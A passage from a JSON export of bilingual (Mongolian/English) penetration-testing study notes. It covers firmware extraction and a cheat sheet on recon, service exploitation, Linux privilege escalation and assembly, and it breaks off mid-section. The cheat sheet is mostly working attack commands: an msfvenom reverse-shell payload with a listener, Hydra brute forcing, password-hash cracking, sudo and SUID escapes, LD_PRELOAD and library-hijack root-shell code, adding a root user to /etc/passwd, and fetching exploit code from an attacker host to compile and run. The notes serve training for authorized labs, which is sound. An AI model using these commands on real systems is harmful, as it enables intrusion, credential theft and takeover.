↓\n✂️ \"Задлая.\"\n```\n\n---\n\n# 🧱 5.2 — JFFS2 гэж юу вэ?\n\nЭнд нэг том concept нэмэх хэрэгтэй.\n\nFirmware image дотор filesystem байдаг.\n\nLinux PC дээр чи:\n\n```\next4\nxfs\nbtrfs\n```\n\nгэдгийг харж болно.\n\nEmbedded төхөөрөмж дээр flash memory-д зориулсан filesystem-үүд элбэг.\n\n**JFFS2 = Journalling Flash File System 2**\n\nгэж сана.\n\nЭнийг:\n\n> 🧰 **“Flash memory дээр filesystem хэлбэрээр файл хадгалах систем.”**\n\nгэж ойлго.\n\n---\n\n# 🧠 Яагаад JFFS2 хэрэгтэй вэ?\n\nEmbedded device:\n\n```\n💾 Flash memory\n```\n\nашигладаг.\n\nFlash-ийн behavior нь энгийн hard disk-ээс өөр.\n\nТиймээс embedded-oriented filesystem хэрэгтэй.\n\nMental model:\n\n```\n🧠 Linux\n   │\n   ▼\n📁 Filesystem\n   │\n   ▼\n💾 Flash memory\n```\n\n---\n\n# 🚪 5.2.1 — Mount гэж яг юу вэ?\n\nЭнэ concept маш чухал.\n\nЧи filesystem-ийг:\n\n```\n📦 JFFS2 image\n```\n\nгэж авлаа.\n\nГэхдээ тэр одоохондоо “file” байна.\n\nLinux:\n\n> “Би үүнийг folder шиг ашигламаар байна.”\n\nТэгээд:\n\n```\nMOUNT\n```\n\nхийнэ.\n\nMental image:\n\n```\n📦 filesystem image\n       │\n       │ mount\n       ▼\n📂 /mnt/jffs2_file/\n```\n\nОдоо чи:\n\n```\ncd /mnt/jffs2_file/\nls\n```\n\nгэж filesystem дотор байгаа юм шиг ажиллаж чадна.\n\n### 🧠 Memory\n\n> **Mount = “Filesystem-ийг Linux-ийн directory tree-д залгах.”**\n\nЭнийг маш сайн ойлго. Reverse engineering-д байнга таарна.\n\n---\n\n# 🧱 `mknod` — “Linux-д block device байгаа мэт харагдуулах”\n\n```\nsudo mknod /dev/mtdblock0 b 31 0\n```\n\nЭнэ хэсгийг command цээжлэхээс илүү concept-оор ойлго.\n\n`/dev/...` дотор Linux-ийн төхөөрөмжүүдийг **device node** хэлбэрээр төлөөлүүлж болдог.\n\nЭнд:\n\n```\n/dev/mtdblock0\n```\n\nгэдэг нь:\n\n> **Flash/block device-ийг filesystem-д хүргэх interface**\n\nгэж төсөөлж болно.\n\n---\n\n# 🧩 `modprobe`\n\n```\nsudo modprobe jffs2 mtdram mtdblock\n```\n\nЭнэ:\n\n> **“Kernel-д хэрэгтэй module-уудыг ачаал.”**\n\nгэсэн санаа.\n\nMental image:\n\n```\n🧠 Kernel\n  │\n  ├── JFFS2 knowledge ❌\n  │\n  ├── MTD support ❌\n  │\n  ▼\nmodprobe\n  │\n  ▼\nmodules loaded ✅\n```\n\n### 🧠 Memory\n\n> **modprobe = “Kernel-д шинэ чадвар суулгах.”**\n\n---\n\n# 💾 `dd` — “Raw bytes зөөх”\n\n```\nsudo dd if=filesystem.jffs2 of=/dev/mtdblock0\n```\n\n`dd`-г:\n\n> 📦 **“Bytes-ийг яг raw байдлаар хуулдаг машин.”**\n\nгэж ойлго.\n\n```\nif = input file\nof = output file\n```\n\nТэгэхээр:\n\n```\nfilesystem.jffs2\n       │\n       │ raw bytes\n       ▼\n/dev/mtdblock0\n```\n\n### 🧠 Memory\n\n> **`if` = авч байгаа зүйл**\n> \n> **`of` = очих газар**\n\n---\n\n# 📂 `mount`\n\n```\nsudo mount -t jffs2 /dev/mtdblock0 /mnt/jffs2_file/\n```\n\nОдоо:\n\n```\n💾 block device\n   ↓\n🧱 JFFS2\n   ↓\n📂 /mnt/jffs2_file/\n```\n\nгээд Linux filesystem tree-д залгагдана.\n\n---\n\n# ⚠️ Гэхдээ firmware RE дээр илүү чухал арга байдаг\n\nЧиний source энэ JFFS2 mounting workflow-ийг өгч байна. Гэхдээ firmware image бүр:\n\n> **JFFS2 байна**\n\nгэсэн үг биш.\n\nӨөр firmware:\n\n```\nSquashFS\nUBIFS\nCramFS\nYAFFS\next filesystem\ncustom container\n```\n\nгэх мэт байж болно.\n\nТиймээс зөв workflow:\n\n```\n🔎 Identify filesystem\n       ↓\n🤔 What filesystem is it?\n       ↓\n🛠️ Choose appropriate extraction/mount method\n```\n\n### 🧠 Golden rule\n\n> **Эхлээд filesystem-ийг тань. Дараа нь mount хийх арга сонго.**\n\n---\n\n# 🎯 5.3 — Firmware дотор юуг хамгийн түрүүнд үзэх вэ?\n\nОдоо firmware-г:\n\n# 🏠 Нэг төхөөрөмжийн бүхэл бүтэн байшин\n\nгэж бод.\n\n---\n\n## 🔑 `/etc/shadow` / `/etc/passwd`\n\n```\n/etc/passwd\n/etc/shadow\n```\n\nЭнд operating system-ийн account-related information байна.\n\nMental image:\n\n```\n📁 /etc\n   │\n   ├── 👥 passwd\n   └── 🔐 shadow\n```\n\nReverse engineering perspective:\n\n> **“Төхөөрөмж дээр ямар account model ашигласан бэ?”**\n\nгэж харахад тусална.\n\nHardcoded/default credentials байж болох эсэхийг мөн судална.\n\n---\n\n# 🌐 `/www` / `/htdocs`\n\nЭнийг:\n\n# 🖥️ “Router-ийн веб application-ийн арын өрөө”\n\nгэж төсөөл.\n\n```\nBrowser\n   ↓\n🌐 Web UI\n   ↓\n/www\n/htdocs\n   ↓\nHTML\nPHP\nJS\ntemplates\nconfig\n```\n\nЭндээс:\n\n```\n🔐 authentication\n⚙️ configuration\n🌐 API endpoints\n🧠 business logic\n```\n\nгэх мэт зүйлсийг судалж болно.\n\nТөхөөрөмжийн admin panel-ийн frontend/backend behavior-ийг ойлгоход их үнэ цэнтэй.\n\n---\n\n# 🏭 `/etc/system_defaults`\n\nЭнэ зам нь universal Linux standard path биш гэдгийг анхаар.\n\nГэхдээ тухайн төхөөрөмжийн firmware-д ийм custom path байвал:\n\n```\n/etc/system_defaults\n```\n\nгэх мэт файл/directory дотор:\n\n```\n🏭 Factory defaults\n🔑 Default credentials\n📡 AP keys\n⚙️ Device settings\n```\n\nбайж болох тул high-value target болдог.\n\n### 🧠 Memory:\n\n> **Factory reset хийсний дараа төхөөрөмж яаж дахин “танил” болдог вэ?**\n\nгэсэн асуулт асуу.\n\n---\n\n# 🧠 Firmware RE дээр ЭНЭ 5 АСУУЛТЫГ асуу\n\nFirmware задласныхаа дараа:\n\n### 1️⃣ 🧩 ЯМАР FORMAT?\n\n```\nSquashFS?\nJFFS2?\nUBIFS?\nCustom?\n```\n\n### 2️⃣ 🧠 ЯМАР KERNEL?\n\n```\nversion?\narchitecture?\nmodules?\n```\n\n### 3️⃣ 👤 ЯМАР USER?\n\n```\n/etc/passwd\n/etc/shadow\n```\n\n### 4️⃣ 🌐 ЯМАР APPLICATION?\n\n```\n/www\n/htdocs\n/cgi-bin\n```\n\n### 5️⃣ 🔑 ЯМАР SECRET?\n\n```\nconfig\nkeys\npasswords\ncertificates\ndefault settings\n```\n\n---\n\n# 🔥 Би энэ хэсэгт 4 concept нэмж цээжлүүлэхийг зөвлөе\n\nЭнэ нь чиний одоогийн note-ийг илүү сайн болгоно.\n\n---\n\n## 🧠 1. Architecture\n\nFirmware:\n\n```\nARM?\nMIPS?\nx86?\nARM64?\n```\n\nгэдгийг мэдэх хэрэгтэй.\n\nЯагаад?\n\nУчир нь:\n\n```\n📦 Binary\n   ↓\n🧠 CPU architecture\n   ↓\n🔬 Disassembly / execution\n```\n\narchitecture буруу ойлговол binary-ийн analysis утгаа алдана.\n\n---\n\n## 🧠 2. Compression vs Filesystem\n\nFirmware дотор:\n\n```\nCOMPRESSED DATA\n```\n\nбайж болно.\n\nЭнэ нь:\n\n> **filesystem**\n\nгэдэгтэй адил биш.\n\nMental distinction:\n\n```\n🗜️ Compression\n= \"жижиг болгож багцалсан\"\n\n📁 Filesystem\n= \"файлуудыг зохион байгуулсан бүтэц\"\n```\n\nЭнэ хоёрыг ялга.\n\n---\n\n## 🧠 3. Entropy\n\nFirmware analysis-д data-ийн **entropy** нь заримдаа:\n\n> “Энэ хэсэг compressed/encrypted байх магадлалтай юу?”\n\nгэх мэт асуултад clue өгч болно.\n\nMental image:\n\n```\n📉 Low entropy\n→ structure/text илүү харагдах\n\n📈 High entropy\n→ compressed/encrypted/random-looking\n```\n\nГэхдээ entropy **дангаараа encrypted гэдгийг батлахгүй**.\n\n---\n\n## 🧠 4. Strings first\n\nFirmware задалсны дараа шууд бүх binary-г reverse engineer хийх хэрэггүй.\n\nЭхлээд:\n\n```\n📦 extract\n ↓\n🧾 strings\n ↓\n🔍 grep/search\n ↓\n🎯 interesting binary\n ↓\n🔬 deeper RE\n```\n\nгэж явбал илүү үр дүнтэй.\n\nЖишээ clue:\n\n```\n\"admin\"\n\"password\"\n\"http\"\n\"/cgi-bin/\"\n\"telnet\"\n\"ssh\"\n\"factory\"\n```\n\nгэх мэт strings нь хаашаа ухахаа зааж болно.\n\n---\n\n# 🗺️ FIRMWARE RE — COMPLETE MAP\n\nОдоо бүх хэсгийг нэг зураг болгоё:\n\n```\n                 📦 FIRMWARE\n                      │\n                      ▼\n                🔎 BINWALK\n                      │\n             \"Юу дотор байна?\"\n                      │\n                      ▼\n                  ✂️ EXTRACT\n                      │\n                      ▼\n             🧩 IDENTIFY FORMAT\n                      │\n        ┌─────────────┼─────────────┐\n        ▼             ▼             ▼\n      JFFS2        SquashFS       UBIFS\n        │\n        ▼\n       🧱 MOUNT\n        │\n        ▼\n       📂 ROOT FS\n        │\n   ┌────┼────┬─────────┐\n   ▼    ▼    ▼         ▼\n /etc  /www  configs  binaries\n   │    │      │          │\n   ▼    ▼      ▼          ▼\n users web    secrets     🔬 RE\n   │    │\n   └────┴──────────┬─────────\n                   ▼\n                🧠 DEVICE\n                   LOGIC\n```\n\n---\n\n# 🧠 ONE-PAGE MEMORY WALL — Илүү хүчтэй хувилбар\n\n```\n📦 FIRMWARE\n│\n├── 🔎 binwalk\n│     └── \"What layers exist?\"\n│\n├── ✂️ extract\n│     └── \"Give me the pieces.\"\n│\n├── 🧩 identify FS\n│     └── JFFS2 / SquashFS / UBIFS / ...\n│\n├── 🧱 mount\n│     └── \"Turn filesystem into folders.\"\n│\n├── 🧬 architecture\n│     └── ARM / MIPS / x86 / ARM64\n│\n├── 🧠 kernel\n│     └── version / modules\n│\n├── 👥 accounts\n│     └── /etc/passwd / shadow\n│\n├── 🌐 web\n│     └── /www /htdocs /cgi-bin\n│\n├── 🔑 secrets\n│     └── configs / keys / credentials\n│\n├── 🏭 defaults\n│     └── factory settings\n│\n└── 🔬 binaries\n      └── strings → disassemble → trace\n```\n\n## 🎯 Firmware-ийн супер memory hook\n\n> **FIND → EXTRACT → IDENTIFY → MOUNT → EXPLORE → RE**\n\nэсвэл бүр Монгол зураг:\n\n> 🔎 **Ол → ✂️ Задал → 🧩 Таних → 🧱 Залга → 🕵️ Судал → 🔬 Reverse engineer**\n\n---\n\n### 🧠 Бүх cybersecurity note-оо нийлүүлбэл\n\n```\n🛰️ RECON\n\"What exists?\"\n\n      ↓\n\n🚪 SERVICES\n\"What is exposed?\"\n\n      ↓\n\n🔓 ACCESS\n\"What can I interact with?\"\n\n      ↓\n\n⬆️ PRIV ESC\n\"What trust/permission can be abused?\"\n\n      ↓\n\n🔬 RE\n\"What is the binary actually doing?\"\n\n      ↓\n\n📦 FIRMWARE\n\"What is hidden inside the device?\"\n```\n\nИнгээд firmware нь тусдаа сэдэв биш болж байгаа юм.\n\n**Recon**-оор төхөөрөмжийг гаднаас нь харна → **Priv Esc**-ээр OS-ийн доторх эрхийн бүтцийг харна → **Reverse Engineering**-ээр binary-ийн дотор орно → **Firmware RE**-ээр бүхэл төхөөрөмжийн image-ийг задлаад **kernel + filesystem + web application + credentials + binaries**-г нэг дор харна.\n\nЭнэ холбоосыг ойлговол note чинь command cheat sheet биш, **нэг бүтэн cybersecurity map** болж эхэлнэ.",
    "sourcePath": "cheater/cheatshit 5.md"
  },
  {
    "id": 10008,
    "title": "cheatshit",
    "room": "cheater",
    "source": "Cyber",
    "stage": "Foundations",
    "tags": [
      "ks-import",
      "cheater",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "10 min",
    "date": "KS import",
    "excerpt": "KS source: cheater/cheatshit.md",
    "content": "# 🧠 Cybersecurity Field Guide\n\n> **Purpose:** Turn a dense technical cheat sheet into a visual, memorable Obsidian note.\n> \n> ⚠️ **Use only on systems, networks, binaries, and labs you are explicitly authorized to test.**\n\n---\n\n# 🗺️ The Big Picture\n\nThink of the whole workflow as a game map:\n\n```\n🛰️ RECON\n   ↓\n🚪 SERVICES\n   ↓\n🔓 ACCESS\n   ↓\n⬆️ PRIV ESC\n   ↓\n🔬 REVERSE ENGINEERING\n   ↓\n📦 FIRMWARE\n```\n\n### 🧩 Memory Hook\n\n> **“See → Enter → Rise → Understand → Extract”**\n\n|Stage|Question to remember|\n|---|---|\n|🛰️ Recon|**What exists?**|\n|🚪 Services|**What is exposed?**|\n|🔓 Access|**Can the service be abused?**|\n|⬆️ Priv Esc|**How do I go higher?**|\n|🔬 RE|**What is the binary doing?**|\n|📦 Firmware|**What is hidden inside?**|\n\n---\n\n# 🛰️ SECTION 1 — RECONNAISSANCE & FOOTPRINTING\n\n## 1A. Passive Recon — 🥷 “See without touching”\n\n> **Goal:** Map the attack surface without sending a packet to the target.\n\n### 🧠 Remember: **W-D-C-S**\n\n**W**HOIS → **D**NS → **C**RTs → **S**hodan/Censys\n\n---\n\n### 🌐 1. WHOIS / RDAP\n\n**Ports:** TCP `43` / HTTPS `443`\n\n```\nwhois target.com | grep -iE \"Registrar:|Name Server:|Creation Date|Expiration Date\"\n```\n\n```\ncurl -s https://rdap.verisign.com/com/v1/domain/target.com | jq .\n```\n\n### 🎯 Look for\n\n- 📅 **Expiration dates** → renewal phishing / hijacking\n    \n- 🌍 **Authoritative nameservers** → hints about infrastructure / WAF presence\n    \n\n---\n\n### 🧭 2. DNS Interrogation\n\n**Port:** UDP/TCP `53`\n\n```\ndig @1.1.1.1 target.com [A|AAAA|CNAME|MX|TXT]\n```\n\nClean output:\n\n```\ndig +short target.com [TYPE]\n```\n\n### 🔍 DNS clues\n\n|Record|Memory image|What to notice|\n|---|---|---|\n|`A`|🏠 IPv4 house|Main IPv4 destination|\n|`AAAA`|🏢 IPv6 building|Compare with `A`|\n|`CNAME`|🪧 Sign pointing elsewhere|Possible dangling alias|\n|`TXT`|📝 Sticky note|SPF / DMARC policy|\n\n> 🧠 **AAAА = “Another Address?”**  \n> Compare IPv6 with IPv4.\n\n> 🧠 **CNAME = “Can Name Mean Elsewhere?”**\n\n> 🧠 **TXT = “Text tells trust.”**\n\nSource examples:\n\n- `AAAA` → compare against `A` for IPv4-only filtering assumptions\n    \n- `CNAME` → look for dangling aliases to deleted S3/GitHub resources\n    \n- `TXT` → inspect SPF and DMARC; the source notes that `p=none` allows email spoofing\n    \n\n---\n\n### 📜 3. Certificate Transparency — crt.sh\n\nPublic certificate logs can reveal subdomains that are not openly advertised.\n\n```\nhttps://crt.sh/?q=%.target.com\n```\n\nCLI extraction:\n\n```\ncurl -s \"https://crt.sh/?q=%.target.com&output=json\" | jq -r '.[].name_value' | sort -u\n```\n\n### 🧠 Memory\n\n> **Certificates remember names.**\n\n---\n\n### 🌍 4. Internet-Wide Scanners\n\n**Shodan / Censys**\n\nExample syntax:\n\n```\nhostname:\"target.com\"\norg:\"Target Corp\"\nproduct:\"Apache\"\nport:80\n```\n\n### 🎯 Look for\n\n- 🗄️ Unindexed databases\n    \n    - MySQL `3306`\n        \n    - Redis `6379`\n        \n- 🛠️ Exposed administration panels\n    \n- 🌐 Recursive DNS resolvers\n    \n\n---\n\n## 1B. Active Recon — 🎯 “Now interact”\n\n> **Goal:** Establish live ground truth by interacting directly with network sockets.\n\n### 🧠 Memory Hook: **P-B-N**\n\n**P**ath → **B**anners → **N**map\n\n---\n\n### 📡 1. Host Discovery & Path Diagnostics\n\n#### Ping\n\n```\nping -c 4 [TARGET_IP]\n```\n\n### TTL clue from the source\n\n```\n≈ 64   → Linux\n≈ 128  → Windows\n```\n\n#### Route mapping\n\n```\ntraceroute [TARGET_IP]\n```\n\n- Linux default → UDP\n    \n- Windows `tracert` → ICMP\n    \n\n#### TCP-based route probing\n\n```\ntraceroute -T -p 80 [TARGET_IP]\n```\n\n> 🧠 **Traceroute = “How do I get there?”**\n\n---\n\n### 📢 2. Banner Grabbing\n\n#### Netcat\n\n```\nnc [TARGET_IP] [PORT]\n```\n\nSource note:\n\n- FTP `21`\n    \n- SMTP `25`\n    \n\n#### Manual HTTP/1.1 probe\n\n```\nnc [TARGET_IP] 80\n```\n\nThen send:\n\n```\nGET / HTTP/1.1\nHost: target\n```\n\nThen:\n\n```\nDouble Enter\n```\n\n#### Headers only\n\n```\ncurl -I http://[TARGET_IP]\n```\n\n> 🧠 **Banner = “Who are you?”**\n\n---\n\n### 🧭 3. Nmap Precision Scanning\n\n#### Full port scan\n\n```\nnmap -p- -T4 [TARGET_IP]\n```\n\n#### Service/version detection\n\n```\nnmap -sV -sC -Pn -p [PORTS] [TARGET_IP]\n```\n\n#### SYN scan\n\n```\nnmap -sS -p [PORTS] [TARGET_IP]\n```\n\n---\n\n# 🚪 SECTION 2 — NETWORK SERVICE EXPLOITATION\n\n> **Memory trick: Ports are doors. Services are what’s behind them.**\n\n## 🔢 Default-Port Map\n\n|🚪 Service|🔢 Port|🧠 Primary vectors from source|\n|---|---|---|\n|FTP|`21`|Anonymous login, Hydra brute-force|\n|SSH|`22`|Stolen private keys, password reuse|\n|Telnet|`23 / 8012+`|Cleartext sniffing, unauthenticated backdoors, Blind RCE|\n|SMTP|`25`|`VRFY` user enumeration, phishing relay|\n|SMB|`139 / 445`|Null sessions, unauthenticated shares|\n|NFS|`2049 / 111`|`showmount`, mounting shares, `no_root_squash` SUID|\n|MySQL|`3306`|Default creds, hashdump, Outfile RCE|\n\n---\n\n## 🪟 2A. SMB & NFS Share Attacks\n\n### SMB Null Session Enumeration\n\n```\nenum4linux -a [TARGET_IP]\n```\n\nAnonymous connection:\n\n```\nsmbclient //[TARGET_IP]/[SHARE_NAME] -U Anonymous\n```\n\nSource examples:\n\n```\nget id_rsa\nget backup.zip\n```\n\n### 🧠 SMB memory hook\n\n> **SMB = “Shares May Betray.”**\n\n---\n\n### 📦 NFS\n\nList exports:\n\n```\nshowmount -e [TARGET_IP]\n```\n\nMount locally:\n\n```\nsudo mount -t nfs [TARGET_IP]:[EXPORT_PATH] /mnt/target/ -nolock\n```\n\nThe source highlights:\n\n```\nno_root_squash\n```\n\nas a privilege-escalation condition.\n\n> 🧠 **NFS = “Network File Shelf.”**\n\n---\n\n## ☎️ 2B. Blind RCE & Reverse Shell Protocol\n\n### The Wiretap idea\n\nStart packet capture:\n\n```\nsudo tcpdump ip proto \\icmp -i tun0\n```\n\nTrigger a ping from the target:\n\n```\n.RUN ping [KALI_IP] -c 1\n```\n\n### Confirmation logic\n\n```\nPing arrives?\n   ↓\nYES\n   ↓\nRCE confirmed\n```\n\n> 🧠 **No output? Listen for a side effect.**\n\n---\n\n### Reverse shell workflow\n\nGenerate payload:\n\n```\nmsfvenom -p cmd/unix/reverse_netcat lhost=[KALI_IP] lport=4444 R\n```\n\nStart listener:\n\n```\nnc -lvnp 4444\n```\n\n**Flags:**\n\n- `-l` → listen\n    \n- `-v` → verbose\n    \n- `-n` → numeric / no DNS\n    \n- `-p` → port\n    \n\nConcept:\n\n```\nTarget  ───────►  Kali listener\n          outbound\n```\n\n> 🧠 **Reverse shell = “Target calls you.”**\n\n---\n\n## 🔑 2C. Password Auditing\n\n### Hydra\n\n```\nhydra -t 16 -l [USERNAME] -P /usr/share/wordlists/rockyou.txt -vV [TARGET_IP] [ssh|ftp|mysql]\n```\n\n### John the Ripper\n\nMerge:\n\n```\nunshadow /etc/passwd /etc/shadow > unshadowed.txt\n```\n\nDictionary attack:\n\n```\njohn --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt\n```\n\n### Hashcat — Linux SHA-512 `$6$`\n\n```\nhashcat -m 1800 unshadowed.txt /usr/share/wordlists/rockyou.txt -O\n```\n\n### 🧠 Memory\n\n> **Hydra = online.**  \n> **John / Hashcat = offline.**\n\n---\n\n# ⚡ SECTION 3 — LINUX PRIVILEGE ESCALATION\n\n## 🧠 The “8 Vectors” Ladder\n\nMemorize:\n\n```\n1️⃣ SUDO\n   ↓\n2️⃣ SUID / CAPS\n   ↓\n3️⃣ CRON\n   ↓\n4️⃣ FILES / CREDS\n   ↓\n5️⃣ PATH\n   ↓\n6️⃣ .SO HIJACK\n   ↓\n7️⃣ HISTORY / CONFIG\n   ↓\n8️⃣ KERNEL\n```\n\nThe source also gives this strict triage sequence:\n\n```\n[Step 1: Sudo]\n       ↓\n[Step 2: SUID/Caps]\n       ↓\n[Step 3: Cron]\n       ↓\n[Step 4: Files]\n       ↓\n[Step 5: Local Ports]\n```\n\n> 🧠 **Rule:** Start simple. Escalate complexity only when needed.\n\n---\n\n## 3.1 👑 Sudo Rights\n\nCheck:\n\n```\nsudo -l\n```\n\nCross-reference allowed binaries with:\n\n```\ngtfobins.github.io\n```\n\nSource examples include:\n\n### `find`\n\n```\nsudo find . -exec /bin/bash \\; -quit\n```\n\n### `less`\n\n```\nsudo less /etc/profile\n```\n\nThen:\n\n```\n!/bin/sh\n```\n\n### `awk`\n\n```\nsudo awk 'BEGIN {system(\"/bin/bash\")}'\n```\n\n### `vim`\n\n```\nsudo vim -c '!sh'\n```\n\n### `nano`\n\nSource sequence:\n\n```\nsudo nano\n→ Ctrl+R\n→ Ctrl+X\n→ reset; sh 1>&0 2>&0\n```\n\n> 🧠 **Sudo question:** “What powerful program may I already run as root?”\n\n---\n\n### LD_PRELOAD Injection\n\nCondition:\n\n```\nenv_keep += LD_PRELOAD\n```\n\nSource C code:\n\n```\nvoid _init() {\n    unsetenv(\"LD_PRELOAD\");\n    setgid(0);\n    setuid(0);\n    system(\"/bin/bash\");\n}\n```\n\nCompile:\n\n```\ngcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles\n```\n\nExecute:\n\n```\nsudo LD_PRELOAD=/tmp/shell.so [ANY_ALLOWED_BINARY]\n```\n\n---\n\n# 3.2 🧷 SUID / SGID\n\n### Discovery\n\n```\nfind / -perm -u=s -type f 2>/dev/null\n```\n\nor:\n\n```\nfind / -perm -4000\n```\n\n> 🧠 **4000 = SUID clue**\n\n---\n\n### 📖 Arbitrary File Read\n\nSource examples:\n\n```\nbase64 /etc/shadow | base64 --decode\n```\n\n```\nbase64 /root/root.txt | base64 --decode\n```\n\n### ✍️ Arbitrary File Write\n\nSource workflow:\n\n```\nopenssl passwd -1 -salt evil Password123\n```\n\nThen:\n\n```\nevil:[GENERATED_HASH]:0:0:root:/root:/bin/bash\n```\n\nThe source describes appending/overwriting `/etc/passwd`, then:\n\n```\nsu evil\n```\n\n> 🧠 **SUID question:** “What can run with someone else’s power?”\n\n---\n\n# 3.3 🧬 Linux Capabilities\n\nDiscover:\n\n```\ngetcap -r / 2>/dev/null\n```\n\n### 🎯 Look for\n\n```\ncap_setuid+ep\n```\n\nThe source calls out examples such as Python, Perl, and Vim.\n\nExample from source:\n\n```\npython3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n```\n\n> 🧠 **Capability = “A tiny piece of root power.”**\n\n---\n\n# 3.4 ⏰ Cron Jobs\n\nInspect:\n\n```\ncat /etc/crontab\n```\n\n```\nls -la /etc/cron.* /var/spool/cron/crontabs/\n```\n\n### Two source vectors\n\n**A — Writable script**\n\n```\nRoot runs script\n      ↓\nScript is writable\n      ↓\nModify script\n```\n\n**B — Wildcard tar injection**\n\n```\ntouch /path/to/target/--checkpoint=1\n```\n\n```\ntouch '/path/to/target/--checkpoint-action=exec=sh shell.sh'\n```\n\n> 🧠 **Cron = “Who runs what, and when?”**\n\n---\n\n# 3.5 🛣️ Relative `$PATH` Hijacking\n\n### Discovery idea\n\nFind an SUID binary or root script that invokes a command without an absolute path.\n\nSource example:\n\n```\nsystem(\"service\")\nsystem(\"thm\")\n```\n\nCheck:\n\n```\necho $PATH\n```\n\nPrepend writable directory:\n\n```\nexport PATH=/tmp:$PATH\n```\n\nCreate script:\n\n```\necho '/bin/bash -p' > /tmp/thm\nchmod +x /tmp/thm\n```\n\nRun the SUID binary.\n\nConcept:\n\n```\nRoot program\n    ↓\ncalls \"thm\"\n    ↓\nPATH searched first\n    ↓\n/tmp/thm\n```\n\n> 🧠 **PATH = “Who gets picked first?”**\n\n---\n\n# 3.6 🧪 SUID Shared Object Hijacking\n\nTrace:\n\n```\nstrace [SUID_BINARY] 2>&1 | grep -iE \"open|access|no such file\"\n```\n\n### Look for\n\n```\nMissing .so\n   +\nWritable user directory\n   +\nRPATH / RUNPATH behavior\n```\n\nSource payload pattern:\n\n```\nstatic void inject() __attribute__((constructor));\n\nvoid inject() {\n    system(\"/bin/bash -p\");\n}\n```\n\nCompile:\n\n```\ngcc -shared -fPIC -o /path/to/missing_lib.so payload.c\n```\n\nRun the SUID binary.\n\n> 🧠 **Library hijack = “The program asks for a missing part; you provide it.”**\n\n---\n\n# 3.7 🕵️ Credential & History Hunting\n\n### Bash history\n\n```\ncat ~/.bash_history\n```\n\n```\ngrep -iE \"passw|user|admin|mysql|key\" ~/.bash_history\n```\n\n### Configuration files\n\nSource examples:\n\n```\ncat /etc/openvpn/auth.txt\n```\n\n```\ncat ~/.irssi/config\n```\n\n```\ncat /var/www/html/wp-config.php\n```\n\n### Recursive search\n\n```\ngrep -rnwi \"password\" /home/ /etc/ /var/www/ 2>/dev/null\n```\n\n> 🧠 **Human habit:** people leave clues in history and config.\n\n---\n\n# 3.8 ☠️ Kernel Exploits — Last Resort\n\n### Discovery\n\n```\nuname -a\n```\n\n```\ncat /etc/issue\n```\n\n### Stage from Kali\n\n```\npython3 -m http.server 8000\n```\n\nFetch on target:\n\n```\nwget http://[KALI_IP]:8000/exploit.c -O /tmp/exploit.c\n```\n\nCompile:\n\n```\ngcc -O2 -pthread /tmp/exploit.c -o /tmp/exploit\n```\n\nExecute:\n\n```\nchmod +x /tmp/exploit && /tmp/exploit\n```\n\n### Famous examples in source\n\n```\nCVE-2015-1328 → OverlayFS Local Root\nCVE-2016-5195 → Dirty COW\n```\n\n> 🧠 **Kernel = “Use the big hammer last.”**\n\n---\n\n# 🔬 SECTION 4 — REVERSE ENGINEERING & ASSEMBLY\n\n# 4.1 🧠 x64 CPU Architecture\n\n## The “VIP Registers”\n\n### 📍 RIP — the GPS\n\n> **RIP = Instruction Pointer**\n\nHolds the memory address of the next instruction.\n\nSource idea:\n\n```\nOverwrite RIP\n    ↓\nRedirect execution\n```\n\n### 🧮 RAX — the answer box\n\nStores function return values.\n\nSource example:\n\n```\n1 = True\n0 = False\n```\n\n---\n\n## 🪆 Register Slicing — Matryoshka Dolls\n\nThink:\n\n```\nRAX  64-bit  ┌─────────────────────────────┐\n             │                             │\nEAX  32-bit  ├────────────────────         │\n             │                    │         │\nAX   16-bit  ├────────────        │         │\n             │            │       │         │\nAL    8-bit  ├────        │       │         │\n             └────┬───────┴───────┴─────────┘\n```\n\nMemory order:\n\n```\nRAX → EAX → AX → AL\n64     32     16    8\n```\n\n> 🧠 **Big doll contains smaller dolls.**\n\n---\n\n# 4.2 📞 Fastcall Calling Convention\n\nParameter registers:\n\n```\n1st → RCX\n2nd → RDX\n3rd → R8\n4th → R9\n5th+ → Stack\n```\n\n### 🧠 Memory rhyme\n\n> **“C D 8 9, then Stack.”**\n\n---\n\n# 4.3 🧱 Core Assembly Verbs\n\n|Instruction|Think of it as|\n|---|---|\n|`MOV`|📦 Copy|\n|`LEA`|🧭 Calculate address|\n|`XOR`|🧹 Clear|\n|`CMP`|⚖️ Compare|\n|`JCC`|🚦 Conditional branch|\n|`NOP`|🧍 Do nothing|\n\n### `MOV`\n\n```\nMOV destination, source\n```\n\nCopies data.\n\nSquare brackets:\n\n```\n[ ]\n```\n\nmean memory dereference.\n\n---\n\n### `LEA`\n\n```\nLEA destination, [Address]\n```\n\nCalculates an effective address without dereferencing it.\n\n---\n\n### `XOR`\n\n```\nXOR register, register\n```\n\nSource note:\n\n> Clears a register to zero without generating `\\x00` null bytes.\n\n---\n\n### `CMP`\n\n```\nCMP destination, source\n```\n\nConceptually subtracts to set CPU flags.\n\nImportant source flags:\n\n```\nZF = Zero Flag\nSF = Sign Flag\nOF = Overflow Flag\n```\n\n---\n\n### `JCC` 🚦\n\nCommon conditions:\n\n```\nJE / JZ   → Equal / Zero\nJNE / JNZ → Not equal / Not zero\nJG / JL   → Signed\nJA / JB   → Unsigned\n```\n\n---\n\n### `NOP`\n\n```\n\\x90\n```\n\n> **No Operation**\n\nSource use:\n\n> NOP sleds can help catch unstable execution pointers during buffer overflows.\n\n---\n\n# 4.4 🧠 Memory Layout & Endianness\n\n## Stack\n\n> The stack grows **DOWN** toward lower addresses.\n\n```\nPUSH → RSP decreases\nPOP  → RSP increases\n```\n\n### 🧠 Memory trick\n\n> **Push goes down. Pop comes up.**\n\n---\n\n## Little-Endian\n\nIntel x86/x64 stores the least significant byte first.\n\nExample address:\n\n```\n0x77AABBCC\n```\n\nPayload byte order:\n\n```\n\\xCC\\xBB\\xAA\\x77\n```\n\n> 🧠 **Little = smallest piece first.**\n\n---\n\n# 4.5 🧰 Reverse Engineering Toolkit\n\n### Disassemble\n\n```\nobjdump -M intel -d [BINARY] > source.asm\n```\n\n### Show lines before a call\n\n```\ngrep -B 15 \"call.*<target_func>\" source.asm\n```\n\n### Show lines after a call\n\n```\ngrep -A 20 \"target_func\" source.asm\n```\n\n### Trace shared-library calls\n\n```\nltrace ./[BINARY] [ARGUMENTS]\n```\n\nSource 